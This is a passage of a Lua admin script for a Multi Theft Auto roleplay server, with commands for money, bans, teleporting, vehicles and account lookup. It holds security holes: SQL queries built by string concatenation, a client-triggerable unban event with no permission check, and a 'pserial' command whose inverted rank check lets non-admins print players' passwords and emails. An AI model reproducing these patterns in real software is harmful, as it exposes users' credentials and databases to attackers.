		local MandeBronze = row["pBronzePremium"]
		local MandeColorName = row["pColorNameTime"]
		local MandeBanTime = row["pBanTime"]
		local pSspeakerTime = row["pSspeaker"]
		--> Gold <--
		if MandeGold > 0 then
			local PremiumGold = row["pGoldPremium"]-1
			local query1 = dbQuery(exports.mysql:getMySQLC(), "UPDATE `users` SET `pGoldPremium` = ? WHERE `pID` = '"..myID.."'",PremiumGold)
			dbFree(query1)
		end
		--> Silver <--
		if MandeSilver > 0 then
			local PremiumSilver = row["pSilverPremium"]-1
			local query2 = dbQuery(exports.mysql:getMySQLC(), "UPDATE `users` SET `pSilverPremium` = ? WHERE `pID` = '"..myID.."'",PremiumSilver)
			dbFree(query2)
		end
		--> Bronze <--
		if MandeBronze > 0 then
			local PremiumBronze = row["pBronzePremium"]-1
			local query3 = dbQuery(exports.mysql:getMySQLC(), "UPDATE `users` SET `pBronzePremium` = ? WHERE `pID` = '"..myID.."'",PremiumBronze)
			dbFree(query3)
		end
		--> ColorName Time <--
		if MandeColorName > 0 then
			local ColorName = row["pColorNameTime"]-1
			local query4 = dbQuery(exports.mysql:getMySQLC(), "UPDATE `users` SET `pColorNameTime` = ? WHERE `pID` = '"..myID.."'",ColorName)
			dbFree(query4)
		end
		--> Ban Time <--
		if MandeBanTime > 0 then
			local BanTime = row["pBanTime"]-1
			local query5 = dbQuery(exports.mysql:getMySQLC(), "UPDATE `users` SET `pBanTime` = ? WHERE `pID` = '"..myID.."'",BanTime)
			dbFree(query5)
		end

		--> Speacker Time <--
		if pSspeakerTime > 0 then
			local pSspeakerTimes = row["pSspeaker"]-1
			local query5 = dbQuery(exports.mysql:getMySQLC(), "UPDATE `users` SET `pSspeaker` = ? WHERE `pID` = '"..myID.."'",pSspeakerTimes)
			dbFree(query5)
		end
	end
	--------

end, 3600000, 0)

--> Mute Time
setTimer ( function ()
	for i,m in ipairs ( getElementsByType("player") ) do
		if getElementData(m, "loggedIn") == true then

			if tonumber(getElementData(accSys:getPlayerAcc(m), "pTicketBan")) >= 1 then
				if tonumber(getElementData(accSys:getPlayerAcc(m), "pTicketBan")) == 1 then
					setElementData(accSys:getPlayerAcc(m), "pBanTicketResone" , "")
					setElementData(accSys:getPlayerAcc(m), "pBanTicketBy","")
					PlayerMasseg("Punishment-System","#00FF00Time Ban Ticket Shoma Be Etmam Resid.", m, 255, 255, 255,true)
				end
				local BanTicketTime = getElementData(accSys:getPlayerAcc(m), "pTicketBan")
				local KamSheBanTicketTime = tonumber(BanTicketTime) - 1
				setElementData(accSys:getPlayerAcc(m), "pTicketBan", tonumber(KamSheBanTicketTime))
			end

			if tonumber(getElementData(accSys:getPlayerAcc(m), "pBanAdTime")) >= 1 then
				if tonumber(getElementData(accSys:getPlayerAcc(m), "pBanAdTime")) == 1 then
					setElementData(accSys:getPlayerAcc(m), "pBanAdBy" , "")
					setElementData(accSys:getPlayerAcc(m), "pBanAdResone","")
					PlayerMasseg("Punishment-System","#00FF00Time Ban Ad Shoma Be Etmam Resid.", m, 255, 255, 255,true)
				end
				local BanAdTime = getElementData(accSys:getPlayerAcc(m), "pBanAdTime")
				setElementData(accSys:getPlayerAcc(m), "pBanAdTime", tonumber(tonumber(BanAdTime) - 1))
			end

			if tonumber(getElementData(accSys:getPlayerAcc(m), "pMuteTime")) >= 1 then ---- moghe run shodan server warning va error
				if tonumber(getElementData(accSys:getPlayerAcc(m), "pBanAdTime")) == 1 then
					VoiceSys:setPlayerVoiceMuted(m,false)
					PlayerMasseg("Punishment-System","#00FF00Time Mute Shoma Be Etmam Resid.", m, 255, 255, 255,true)
				end
				local MuteTimesh = getElementData(accSys:getPlayerAcc(m), "pMuteTime")
				local KamSheMuteTime = tonumber(MuteTimesh) - 1
				setElementData(accSys:getPlayerAcc(m), "pMuteTime", tonumber(KamSheMuteTime))
			end

		end
	end
end, 60000, 0)



function registerPlayer2(source,Hexs3, username, password, email)
		local query = dbQuery(exports.mysql:getMySQLC(), "SELECT * FROM users;" )
		local result, numrows = dbPoll(query, dbpTime)
		if (result and numrows > 0) then
			for index, row in pairs(result) do
					exports["notf"]:addNotification(source, "Shoma Ba Movafaghiat Player Ra Az Server Unban Kardid!" , 'success')
			end
			dbFree(query)
		end
		local sefr = 0
		local query = dbQuery(exports.mysql:getMySQLC(), "UPDATE `users` SET `pBanTime` = '"..tonumber(sefr).."' WHERE `pName` = '"..Hexs3.."'")
		dbFree(query)
		local query = dbQuery(exports.mysql:getMySQLC(), "UPDATE `users` SET `pBannedBy` = '"..tonumber(sefr).."' WHERE `pName` = '"..Hexs3.."'")
		dbFree(query)
		local query = dbQuery(exports.mysql:getMySQLC(), "UPDATE `users` SET `pBanReason` = '"..tonumber(sefr).."' WHERE `pName` = '"..Hexs3.."'")
		dbFree(query)
	end
addEvent("UnBanShePlayer", true)
addEventHandler("UnBanShePlayer", getRootElement(), registerPlayer2)


addCommandHandler("unbanp",
function (thePlayer, command, tedad)
	if tonumber(getElementData(accSys:getPlayerAcc(thePlayer), "pAdmin")) < 7 then
		return false
	end
	triggerClientEvent ( thePlayer, "BiadPaneleUnban", thePlayer)
end)
addCommandHandler("givemoney",
	function ( thePlayer, _, player, amount )
		if tonumber(getElementData(accSys:getPlayerAcc(thePlayer), "pAdmin")) < 10 then
			outputChatBox("#ff0000Shoma Dastresi Be In Dastoor Nadarid!", thePlayer, 255, 255, 255, true)
			return false
		end

		
		if player then
			local find = miscSys:findPlayer ( player )
		if find then
		-- FIX (bugfix pass 4): `amount` was only checked for existence. A
		--   negative value silently DRAINED the target ("/givemoney x -50000")
		--   and a fractional one desynced the money counter. Validate it.
		local amount = tonumber(amount)
		if amount then amount = math.floor(amount) end
		if amount and amount > 0 and amount < 100000000 then
				local targetName = getPlayerName ( find )
				givePlayerMoney( find, tonumber( amount ) )
				outputChatBox("#00ff00[Done]: #ffffffShoma Be Player #ff1010"..targetName.." #ffffffMeghdar #ff1010$"..convertNumber(amount).." #ffffffPool Dadid!", thePlayer, 0, 255, 0, true)
				outputChatBox("#ff1010[Tavajoh]: #ffffffAdmin #ff1010"..getPlayerName(thePlayer).." #ffffffBe Shoma #ff1010$"..convertNumber( amount ).." #ffffffPool Dad!", find, 0, 255, 0, true)
				outputDebugString("Admin "..getPlayerName(thePlayer).." Be Player "..targetName.." Meghdar "..amount.."$ Pool Dad!")
				SendDiscordLog("GiveMoneyLOG", thePlayer , _, amount,find )
			for k, chat_admini in ipairs (getElementsByType("player")) do
	        if getElementData(chat_admini, "loggedIn") == true then
	        if tonumber(getElementData(accSys:getPlayerAcc(chat_admini), "pAdmin")) >= 1 then
	        outputChatBox("#ff0000[ADM-Warn]:#ffffff Admin #ff0000"..getPlayerName(thePlayer).." #ffffffBe Playere #ff0000"..targetName.." #ffffffMeghdar #ff0000"..amount.." #ffffffMoney Dad!", chat_admini, 208, 0, 15,true)
	end
	end
	end
			else
				outputChatBox("#ff0000[Error]: #ffffffMeghdar Pool Ra Vared Konid!", thePlayer, 255, 255, 255, true)
			end
			else
				outputChatBox("#ff0000[Error]: #ffffffPlayer Peyda Nashod!", thePlayer, 255, 255, 255, true)
			end
		else
			outputChatBox("#C0C0C0Syntax: /givemoney <PartOfName/ID> <Meghdar>", thePlayer, 255, 0, 0, true)
		end
	end
)
addCommandHandler("takemoney",
function ( thePlayer, _, player, amount )
	if tonumber(getElementData(accSys:getPlayerAcc(thePlayer), "pAdmin")) < 10 then
		outputChatBox("#ff0000Shoma Dastresi Be In Dastoor Nadarid!", thePlayer, 255, 255, 255, true)
		return false
	end

	
	if player then
		local find = miscSys:findPlayer ( player )
		if find then
			if amount then
				if tonumber(amount) < 100000000 and tonumber(amount) > 0 then
					local targetName = getPlayerName ( find )
					if getPlayerMoney( find ) >= tonumber(amount) then

						takePlayerMoney( find, tonumber( amount ) )
						outputChatBox("#00ff00[Done]: #ffffffShoma Az Player #ff1010"..targetName.." #ffffffMeghdar #ff1010$"..convertNumber(amount).." #ffffffPool Take Kardid!", thePlayer, 0, 255, 0, true)
						outputChatBox("#ff1010[Tavajoh]: #ffffffAdmin #ff1010"..getPlayerName(thePlayer).." #ffffffAz Shoma #ff1010$"..convertNumber( amount ).." #ffffffPool Take Kard!", find, 0, 255, 0, true)
						outputDebugString("Admin "..getPlayerName(thePlayer).." Az Player "..targetName.." Meghdar "..amount.."$ Pool Take Kard!")
						SendDiscordLog("GiveMoneyLOG", thePlayer , _, amount,find )
						for k, chat_admini in ipairs (getElementsByType("player")) do
	    					if getElementData(chat_admini, "loggedIn") == true then
	    						if tonumber(getElementData(accSys:getPlayerAcc(chat_admini), "pAdmin")) >= 1 then
	    						outputChatBox("#ff0000[ADM-Warn]:#ffffff Admin #ff0000"..getPlayerName(thePlayer).." #ffffffBe Playere #ff0000"..targetName.." #ffffffMeghdar #ff0000"..amount.." #ffffffMoney Dad!", chat_admini, 208, 0, 15,true)
								end
							end
						end
					else
						outputChatBox("#ff0000[Error]: #ffffffIn Meghdar Pool Dar Jibesh Nadare Kole Mojodish: "..getPlayerMoney( find ).."!", thePlayer, 255, 255, 255, true)
					end
				else
					outputChatBox("#ff0000[Error]: #ffffffTake Kardane Money Bayad Byn 1 ~ 99,999,999 Bashad!", thePlayer, 255, 255, 255, true)
				end
				
				
			else
				outputChatBox("#ff0000[Error]: #ffffffMeghdar Pool Ra Vared Konid!", thePlayer, 255, 255, 255, true)
			end
		else
			outputChatBox("#ff0000[Error]: #ffffffPlayer Peyda Nashod!", thePlayer, 255, 255, 255, true)
		end
	else
		outputChatBox("#C0C0C0Syntax: /takemoney <PartOfName/ID> <Meghdar>", thePlayer, 255, 0, 0, true)
	end
end)
function convertNumber( number )  
	local formatted = number  
	while true do      
		formatted, k = string.gsub( formatted, "^(-?%d+)(%d%d%d)", '%1,%2' )    
		if ( k==0 ) then      
			break   
		end  
	end  
	return formatted
end

--[[addCommandHandler("moneyall",
function ( thePlayer, command, value)
	if getElementData(thePlayer, "loggedIn") == true then
		if tonumber(getElementData(accSys:getPlayerAcc(thePlayer), "pAdmin")) < 7 then
			outputChatBox("#ff0000Shoma Dastresi Be In Dastoor Nadarid!", thePlayer, 255, 255, 255, true)
			return false
		end
		if value then
		for k, hame_Playera	in ipairs (getElementsByType("player")) do	
			if getElementData(hame_Playera, "loggedIn") == true then
				local value = tonumber(value)
				givePlayerMoney(hame_Playera, value)
				outputChatBox("#00ff00[Tavajoh] #ffffff"..getPlayerName(thePlayer).." #00ff00Be Tamamie Player Haye Online Nafari #ff0000$"..convertNumber(value).." #00ff00Pool Dad!", hame_Playera, 255, 255, 255, true)
			end
		end
		else
			outputChatBox("#C0C0C0Syntax: /moneyall <Meghdar>", thePlayer, 255, 255, 255, true)
		end
	end
end)]]


addCommandHandler("allplayers",
function ( thePlayer, command, value)
	if getElementData(thePlayer, "loggedIn") == true then
		if tonumber(getElementData(accSys:getPlayerAcc(thePlayer), "pAdmin")) < 7 then
			outputChatBox("#ff0000Shoma Dastresi Be In Dastoor Nadarid!", thePlayer, 255, 255, 255, true)
			return false
		end
		local c = 0
		for k, hame_Playera	in ipairs (getElementsByType("player")) do	
			c = c + 1
		end
		outputChatBox("In "..c.." Player Toye Server Hast ", thePlayer, 255, 255, 255, true)
	end
end)
addCommandHandler("namarisho",
function (thePlayer,command,arg)
	if tonumber(getElementData(accSys:getPlayerAcc(thePlayer), "pAdmin")) < 6 then
		outputChatBox("#ff0000Error: Shoma Be In CMD Dastresi Nadarid .", thePlayer, 255, 255, 255, true)
		return
	end
	if arg then
		if not tonumber(arg) or tonumber(arg) < 1 then
			outputChatBox("#ff0000Error: Number Bezan Kioni Khan, Next Mikonamet!", thePlayer, 255, 255, 255, true)
			return
		end
		setElementAlpha ( thePlayer, tonumber(arg) )
		if tonumber(arg) ~= 255 then
			setElementData(thePlayer, "invis", true)
		end
		return
	end
	if getElementAlpha( thePlayer ) == 0 then
		setPlayerNametagShowing ( thePlayer, true )
		setElementAlpha ( thePlayer, 255 ) 
		setElementData(thePlayer, "invis", nil)
	else
		setPlayerNametagShowing ( thePlayer, false )
		setElementAlpha ( thePlayer, 0 )
		setElementData(thePlayer, "invis", true)
	end
end)

addCommandHandler("mehrabani",
function (thePlayer, command)
	if getElementData(thePlayer, "loggedIn") == true then
		if tonumber(getElementData(accSys:getPlayerAcc(thePlayer), "pAdmin")) >= 8 then
			for k, hame_Playera	in ipairs (getElementsByType("player")) do	
				if getElementData(hame_Playera, "loggedIn") == true then
				   givePlayerMoney(hame_Playera, 50000)
				   outputChatBox("#f3dd63[Arthur-Bot]:#ffffff Be Monasebat Tasise Arthur MTA Be Player Haye Online Meghdar #00ff00$50,000 #ffffffPol Dade Shod!", hame_Playera, 255, 255, 255, true)
				end
			end
		end
	end
end)






local ahelpdata = {
	{ "#00ff00/goto <PartOfName/Id> #ffff00-- #ff0000Teleport Be Player" , 1 },
	{ "#00ff00/gethere <PartOfName/Id> #ffff00-- #ff0000Teleporte Player Be Shoma" , 2 },
	{ "#00ff00/gotopos <X> <Y> <Z> <Int> <Dim> #ffff00-- #ff0000 Teleport Be Mokhtasat" , 2 },
	{ "#00ff00/respawn <PartOfName/Id> #ffff00-- #ff0000Spawne Dobare Player" , 4 },
	{ "#00ff00/respawnall #ffff00-- #ff0000Respawne Tamami Player Ha" , 8 },
	{ "#00ff00/takegun <PartOfName/Id> #ffff00-- #ff0000Gereftane Aslahe Haye Player" , 5 },
	{ "#00ff00/setfp <PartOfName/Id> <FP> #ffff00-- #ff0000Set Kardane Faction Punishe Player" , 4 },
	--{ "#00ff00/setvip <PartOfName/Id> <Days> #ffff00-- #ff0000Set Kardane Roz Haye Vip Player" , 6 },
	{ "#00ff00/cskin <PartOfName/Id> <SkinID> #ffff00-- #ff0000Set Kardane Skine Player" , 7 },
	{ "#00ff00/sethp <PartOfName/Id> <Value> #ffff00-- #ff0000Set Kardan Healthe Taraf" , 1 },
	{ "#00ff00/setwanted <PartOfName/Id> <Value> #ffff00-- #ff0000Set Kardane Wantede Player" , 3 },
	{ "#00ff00/givemoney <PartOfName/Id> <Value> #ffff00-- #ff0000Dadane Pool Be Player" , 8 },
	{ "#00ff00/getpos #ffff00-- #ff0000Gereftane Mokhtasate Khod" , 8 },
	--{ "#00ff00/dep <Message> #ffff00-- #ff0000Dadane Chat Dar Bisim Markazi" , 4 },
	{ "#00ff00/o <Message>#ffff00-- #ff0000Chate Hameganie Staff" , 2 },
	{ "#00ff00/dav <Message>#ffff00-- #ff0000Chate Hameganie Staff ((Anonymous))" , 2 },
	{ "#00ff00/notf <Message>#ffff00-- #ff0000Not Baraye Hame ((Anonymous))" , 7 },
	{ "#00ff00/cc #ffff00-- #ff0000Pak Kardane Chate Server" , 1 },
	{ "#00ff00/gg <PartOfName/Id> <GunID> <Bullet> #ffff00-- #ff0000Dadane Aslahe Be Player" , 2 },
	{ "#00ff00/rec <PartOfName/Id> #ffff00-- #ff0000Reconnect Dadane Player" , 7 },
	{ "#00ff00/i #ffff00-- #ff0000Invisible Shodan" , 6 },
	{ "#00ff00/makehelper #ffff00-- #ff0000Set Kardane Ranke Helperi" , 3 },
	{ "#00ff00/veh <Vehicle-ID>#ffff00-- #ff0000Spawn Kardan Mashine Admini" , 2 },
	--{ "#00ff00/afreezecars #ffff00-- #ff0000Freeze Kardane Tamame Mashin Haye Admini" , 2 },
	--{ "#00ff00/aunfreezecars #ffff00-- #ff0000UnFreeze Kardane Tamame Mashin Haye Admini" , 2 },
	--{ "#00ff00/arespawncars #ffff00-- #ff0000Respawn Kardane Tamami Mashin Haye Admini" , 2 },
	--{ "#00ff00/davall #ffff00-- #ff0000Pak Kardane Tamam Mashin Haye Admini" , 2 },
	{ "#00ff00/dav #ffff00-- #ff0000Pak Kardane Mashine Admini Ke Savareshid" , 2 },
	{ "#00ff00/dv #ffff00-- #ff0000Pak Kardane Mashini Ke Savareshid" , 2 },
	{ "#00ff00/fixall #ffff00-- #ff0000Fix Kardane Tamam Mashin Haye Server" , 6 },
	{ "#00ff00/fix <PartOfName/Id> #ffff00-- #ff0000Fix Kardane Mashine Player" , 1 },
	{ "#00ff00/vgm #ffff00-- #ff0000GodMode Kardane Mashini Ke Savareshid" , 6 },
	{ "#00ff00/svrv #ffff00-- #ff0000Respawn Kardane Tamami Mashin Haye Server" , 8 },
	{ "#00ff00/derbymode #ffff00-- #ff0000Faal Kardane Halate Derby" , 6 },
	{ "#00ff00/changepass <PartOfName/Id> #ffff00-- #ff0000Taghiire Passworde Accounte Player" , 8 },
	{ "#00ff00/respectall <Value> #ffff00-- #ff0000Respect Dadan Be Tamami Playera" , 8 },
	{ "#00ff00/respect <PartOfName/Id> <Value>#ffff00-- #ff0000Respect Dadan Be Player" , 9 },
	{ "#00ff00/moneyall <Value> #ffff00-- #ff0000Dadane Pool Be Kole Server" , 9 },
	--{ "#00ff00/execute <PartOfName/Id> <CMD>#ffff00-- #ff0000Ejra Kardane Cmd Roye Player" , 9 },
	{ "#00ff00/ertefa <Value> #ffff00-- #ff0000Taghiire Ertefae Mashin" , 3 },
	{ "#00ff00/getcarhere <Plate> #ffff00-- #ff0000Get Kardane Mashin Ba Pelak" , 4 },
	{ "#00ff00/shonod #ffff00-- #ff0000Shenidane Kole Voice Chat Haye Server" , 1 },
	{ "#00ff00/gm #ffff00-- #ff0000Faal Kardane Godmode Baraye Khod" , 2 },
	{ "#00ff00/pmembers <FactionID> #ffff00-- #ff0000Didane Liste Member Haye Faction" , 6 },
	{ "#00ff00/fdemote <Refferal> #ffff00-- #ff0000Offline Demote Kardane Player Az Faction" , 6 },
	{ "#00ff00/puser <Name>#ffff00-- #ff0000Didane Accounte Player Dar Database" , 9 },
	{ "#00ff00/pserial <Serial> #ffff00-- #ff0000Didane Accounte Player Dar Database" , 9 },
	--{ "#00ff00/getcarowner #ffff00-- #ff0000Faal Kardane Get Car Owner Mode" , 2 },
	{ "#00ff00/awanteds #ffff00-- #ff0000Didane Liste Wanted Haye Server" , 1 },
	{ "#00ff00/ijs #ffff00-- #ff0000Didane Liste Zendani Haye Server" , 1 },
	{ "#00ff00/unjail #ffff00-- #ff0000Azad Kardane Player Az Zendan" , 1 },
	--{ "#00ff00/setfood <PartOfName/Id> <Value> #ffff00-- #ff0000Set Kardane Goshnegi Player" , 2 },
	--{ "#00ff00/setwater <PartOfName/Id> <Value> #ffff00-- #ff0000Set Kardane Teshnegi Player" , 2 },
	--{ "#00ff00/showvip <PartOfName/Id>#ffff00-- #ff0000Didane Roz Haye Vip Player" , 1 },
	{ "#00ff00/showfp <PartOfName/Id>#ffff00-- #ff0000Didane Saat Haye Fp Player" , 1 },
	{ "#00ff00/showslot <PartOfName/Id>#ffff00-- #ff0000Didane Slote Mashine Player" , 1 },
	{ "#00ff00/gv #ffff00-- #ff0000Baz Kardane Global Voice" , 8 },
	--{ "#00ff00/getfastpos #ffff00-- #ff0000Gereftane Position Tablei" , 8 },
	--{ "#00ff00/setcontractall <Value>#ffff00-- #ff0000Set Kardane Contract Baraye Kole Server" , 9 },
	{ "#00ff00/ghorekeshi #ffff00-- #ff0000Bargozari GhoreKeshi Dar Server" , 6 },
	{ "#00ff00/jetpack #ffff00-- #ff0000Faal Kardane jetpack" , 1 },
	{ "#00ff00/getcarpos #ffff00-- #ff0000Gereftane Positione Mashini Ke Savareshid" , 9 },
	--{ "#00ff00/setbenzin <Value> #ffff00-- #ff0000Set Kardane Benzine Mashini Ke Savareshid" , 9 },
	{ "#00ff00/afill #ffff00-- #ff0000Por Kardane Benzine Mashini Ke Savareshid" , 1 },
	{ "#00ff00/setpelak <Pelak> #ffff00-- #ff0000Set Kardane Pelake Mashin" , 8 },
	{ "#00ff00/ggun #ffff00-- #ff0000Faal Kardane Gravity Gun" , 7 },
	--{ "#f4f000Bokhoresh" , 7 },
}
addCommandHandler ( "ahelp",
function ( thePlayer, command)
	if tonumber(getElementData(accSys:getPlayerAcc(thePlayer), "pAdmin")) > 0 then
		local MyAdminRank = tonumber(getElementData(accSys:getPlayerAcc(thePlayer), "pAdmin"))
		for i=1,#ahelpdata do 
			if MyAdminRank >= ahelpdata[i][2] then
				outputChatBox(""..ahelpdata[i][1].."", thePlayer, 0, 255, 0,true)
			end
		end
	else
		outputChatBox("#ff0000Error: Shoma Be In Dastoor Dastresi Nadarid!", thePlayer, 255, 255, 255, true)
	end
end)

addCommandHandler ( "setpelak",
function ( thePlayer, command, plate)
	if tonumber(getElementData(accSys:getPlayerAcc(thePlayer), "pAdmin")) < 8 then
		outputChatBox("#ff0000Error: Shoma Be In CMD Dastresi Nadarid .", thePlayer, 255, 255, 255, true)
		return false
	end
	if isPedInVehicle (thePlayer) then
		if (plate == nil) then
			outputChatBox("#ff0000Bezan: /"..command.." <Pelak>", thePlayer, 255, 255, 255, true)
		else
			local veh = getPedOccupiedVehicle (thePlayer)
			local oldplate = getVehiclePlateText ( veh )
			setVehiclePlateText( veh, plate )
			outputChatBox("#00ff00[Done]: #ffffffPelak Khodro Be #00ff00("..plate..") #ffffffTaghir Yaft! ", thePlayer, 0, 255, 0,true)
		end
	else
		outputChatBox("#ff0000Error: Baraye inkar Bayad Savar Mashin Bashid!", thePlayer, 255, 255, 255, true)
	end
end)

addCommandHandler("showslot",
function ( thePlayer, command, player )
	if tonumber(getElementData(accSys:getPlayerAcc(thePlayer), "pAdmin")) < 1 then
		outputChatBox("#ff0000Error: Shoma Be In CMD Dastresi Nadarid .", thePlayer, 255, 255, 255, true)
		return
	end
	if player then
		local taraf = miscSys:findPlayer(player)
		if taraf then 
			local KhamireYaro = getElementData(accSys:getPlayerAcc(taraf), "pSlot")
			outputChatBox("#ff0000[Slot]: #ffffffTedad Car Slot Player "..getPlayerName(taraf).." : #ff0000"..KhamireYaro.."", thePlayer, 255, 255, 255, true)
		else
			outputChatBox("#ff0000Error: Player Find Nashod Chaghal!", thePlayer, 255, 255, 255, true)
		end
	else
		outputChatBox("#ff0000Syntax: /showslot <PartOfName/ID>", thePlayer, 255, 255, 255, true)
	end
end)
--___________________________________________________________________________________________________________________--#ExoPrim#ExoPrim
addCommandHandler("ijs",
function (thePlayer)
	if tonumber(getElementData(accSys:getPlayerAcc(thePlayer), "pAdmin")) > 0 then
		outputChatBox("#ff0000((#ffff00________________#ffff00Jailed Players#ffff00________________#ff0000))", thePlayer, 255, 255, 255, true)
		for i, v in ipairs(getElementsByType("player")) do
			if getElementData(v, "loggedIn") == true then
				local JailTime = getElementData(accSys:getPlayerAcc(v), "pJailTime")
				if JailTime > 0 then
					local JailJa = getElementData(accSys:getPlayerAcc(v), "pAJailed")
					outputChatBox("#ffff00Player: #ff0000"..getPlayerName(v).." ("..getElementData(v,"TarafID")..")#ffff00 | Jail: #ff0000"..JailNames[JailJa][1].."#ffff00 | Time: #ff0000"..JailTime.."", thePlayer, 255, 255, 255, true)
				end
			end
		end
		outputChatBox("#ff0000((#ffff00_____________________________________________#ff0000))", thePlayer, 255, 255, 255, true)
	else
		outputChatBox("#ff0000Error: Shoma Be In Dastoor Dastresi Nadarid!", thePlayer, 255, 255, 255, true)
	end
end)
--__________________________________________________________________________________________________________________________--
addCommandHandler("shonod",
function ( thePlayer, command )
	if tonumber(getElementData(accSys:getPlayerAcc(thePlayer), "pAdmin")) < 1 then
		outputChatBox("#ff0000Error: Shoma Be In CMD Dastresi Nadarid .", thePlayer, 255, 255, 255, true)
		return
	end
	if getElementData(thePlayer,"InShonod") == true then
		outputChatBox("#ff0000[Shonod]:#ffffff Halate Shonod #ff0000Off #ffffffShod!", thePlayer, 255, 255, 255, true)
		setElementData(thePlayer,"InShonod",nil)
	else
		outputChatBox("#ff0000[Shonod]:#ffffff Halate Shonod #00ff00On #ffffffShod!", thePlayer, 255, 255, 255, true)
		setElementData(thePlayer,"InShonod",true)
	end
end)
--___________________________________________________________________________________________________________________--#ExoPrim
function distanceFixVeh (thePlayer, cmd, dis)
	if tonumber(getElementData(accSys:getPlayerAcc(thePlayer), "pAdmin")) < 5 then
		outputChatBox("#ff0000Shoma Dastresi Be In Dastoor Nadarid.", thePlayer, 255, 255, 255, true)
		return false
	end
			if dis then
				local disNum = tonumber(dis)
				if disNum then
							local x,y,z = getElementPosition(thePlayer)
							local Sphere = createColSphere( x,y,z, disNum )
							local nearbyVehicles = getElementsWithinColShape( Sphere, "vehicle" )
							local nearbyPlayers = getElementsWithinColShape( Sphere, "player" )
							destroyElement(Sphere)
							for i,v in ipairs(nearbyVehicles) do
								fixVehicle(v)
							end
							for i,p in ipairs(nearbyPlayers) do
								outputChatBox("#00ff00[Tavajoh] #ffffff"..getPlayerName(thePlayer).." #00ff00Khodroy'e Shoma Ra #ffffffFix #00ff00Kard.", p, 0, 255, 0,true)
							end
				else
					outputChatBox("#ff0000 ✖️ #ffffffBaraye Fasele Bayad Adad Vared Konid.",thePlayer,255,255,255,true)
				end
		else
			outputChatBox("#C0C0C0Bezan: /fixall <Distance>", thePlayer, 255, 255, 255, true)
		end
end
addCommandHandler("fixall",distanceFixVeh)
--___________________________________________________________________________________________________________________--#ExoPrim
addCommandHandler("awanteds",
function (thePlayer)
	if tonumber(getElementData(accSys:getPlayerAcc(thePlayer), "pAdmin")) > 1 then
		outputChatBox("#97bbf4((________________Wanteds________________))", thePlayer, 255, 255, 255, true)
		for i, v in ipairs(getElementsByType("player")) do
			if getElementData(v, "loggedIn") == true then
				if getPlayerWantedLevel(v) > 0 then
					outputChatBox("#97bbf4Player : #ffffff"..getPlayerName(v).." (".. getElementData(v, "TarafID")..") #97bbf4Tedad Wanted: #ffffff"..getPlayerWantedLevel(v), thePlayer, 255, 255, 255, true)
				end
			end
		end
	else
		outputChatBox("#ff0000Error: Shoma Be In Dastoor Dastresi Nadarid!", thePlayer, 255, 255, 255, true)
	end
end)
--___________________________________________________________________________________________________________________--#ExoPrim

addCommandHandler("pserial",
function(thePlayer, cmd, username)
	if tonumber(getElementData(accSys:getPlayerAcc(thePlayer), "pAdmin")) < 12 then
	if (username) then
		local user = username
			local query = dbQuery(exports.mysql:getMySQLC(), "SELECT * FROM users;" )
			local result, numrows = dbPoll(query, dbpTime)
			if (result and numrows > 0) then
				for index, row in pairs(result) do
					local pname = row['pSerial']
					if pname == user then
						local pw = row['pKey']
						local lvl = row['pLevel']
						local pref = row['pID']
						local mail = row['pEmail']
						local serial = row['pName']
						outputChatBox("#ff0000[Sirius-Bot] Name: #ffffff"..pname.." #ff0000Password: #ffffff"..pw.." #ff0000Referral: #ffffff"..pref.." #ff0000Email: #ffffff"..mail.." #ff0000Serial: #ffffff"..serial.."", thePlayer, 255, 255, 255, true)
					end
				end
				dbFree(query)
			end
	end
    end
end)

--___________________________________________________________________________________________________________________--#ExoPrim
--___________________________________________________________________________________________________________________--#ExoPrim
addCommandHandler("svrv",
function ( thePlayer, command )
	if tonumber(getElementData(accSys:getPlayerAcc(thePlayer), "pAdmin")) < 7 then
		outputChatBox("#ff0000✖️ Shoma Dastresi Be In Dastoor Ra Nadarid!", thePlayer, 255, 255, 255, true)
		return false
	end
	for index,vehs in ipairs (getElementsByType("vehicle")) do
		if vehs then
			if not isVehicleLocked ( vehs ) then  
				if isVehicleEmpty(vehs) then
					respawnVehicle(vehs)
					setVehicleEngineState(vehs, false)
				end
			end
			setElementData(vehs,"fuel",100)
		end
	end
	outputChatBox("#00ff00☑️ #ffffffShoma Tamami Mashin Haye Server Ra #00ff00Respawn #ffffffKardid!", thePlayer, 255, 255, 255, true)
end
)
--___________________________________________________________________________________________________________________--#ExoPrim
--___________________________________________________________________________________________________________________--#ExoPrim#ExoPrim
addCommandHandler("setwanted",
function ( thePlayer, command , player, value)
	if tonumber(getElementData(accSys:getPlayerAcc(thePlayer), "pAdmin")) < 5 then
		outputChatBox("#33AA33Error: Motasefane dastresi be in dastoor baraye shoma maghdoor nist.", thePlayer, 255, 255, 255, true)
		return false
	end
	local find = miscSys:findPlayer(player)
	if find then
		local value = tonumber(value)
		if value then
			if value <= 6 and value >= 0 then
				setPlayerWantedLevel(find, value)
				outputChatBox("#00ff00 ☑️#ffffffShoma Player #ff0000"..getPlayerName(find).."#ffffff Ra Be "..value.." SetWanted Kardid!", thePlayer, 208, 0, 15,true)	
				outputChatBox("#ffffff Admin #ff0000"..getPlayerName(thePlayer).." #ffffffShoma Ra Be "..value.." SetWanted Kard!", find, 255, 255, 255, true)
			else
				outputChatBox("#ff0000 ✖️ #ffffffPlayer Morede Nazar Peyda Nashod!", thePlayer, 255, 0, 0, true)
			end
		else
			outputChatBox("#A9C4E4Bezan: /setwanted <ID Or PartOfName> <Value>", thePlayer, 255, 0, 0, true)
		end
	else
	    outputChatBox("#A9C4E4Bezan: /setwanted <ID Or PartOfName> <Value>", thePlayer, 255, 0, 0, true)
	end
end)

addCommandHandler("ghorekeshi",
function ( thePlayer, command, tedad)
	if getElementData(thePlayer, "loggedIn") == true then
		if tonumber(getElementData(accSys:getPlayerAcc(thePlayer), "pAdmin")) < 9 then
			outputChatBox("#ff0000Error: Shoma Be In CMD Dastresi Nadarid .", thePlayer, 255, 255, 255, true)
			return
		end
		outputChatBox("#c4ff00[GhoreKeshi]: #ffffffAdmin #c4ff00"..getPlayerName(thePlayer).." #ffffffGhore Keshi Ra Shoro Kard!", getRootElement(), 255, 255, 255, true)
		setTimer ( function()
			local Random = getRandomPlayer()
			outputChatBox("#c4ff00[GhoreKeshi]: #ffffffMomkene #c4ff00"..getPlayerName(Random).."("..getElementData(Random,"TarafID")..") #ffffffBarande In Ghore Keshi Bashe!", getRootElement(), 255, 255, 255, true)
		end, 10000, 3 )
		setTimer ( function()
			outputChatBox("#c4ff00[GhoreKeshi]: #ffffffBarande In Ghore Keshi Kasi Nist Joz ...", getRootElement(), 255, 255, 255, true)
			setTimer ( function()
				local Random = getRandomPlayer()
